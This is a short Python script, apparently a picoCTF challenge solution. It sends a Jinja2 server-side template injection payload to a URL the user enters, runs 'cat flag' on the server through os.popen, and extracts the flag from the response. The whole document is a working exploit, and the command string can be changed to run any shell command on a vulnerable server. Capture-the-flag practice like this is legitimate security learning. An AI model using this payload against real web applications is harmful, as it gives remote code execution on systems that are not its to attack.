#!/bin/python
import requests
import re

URL = input("Enter url: ")

# the shell command to execute
command = "cat flag"

# jinga2 SSTI exploit:
payload = f"{{{{ self.__init__.__globals__.__builtins__.__import__('os').popen('{command}').read() }}}}"
data = {"content": payload}

html = requests.post(URL, data=data).text
print("flag: " + re.findall("picoCTF{.*}", html)[0])
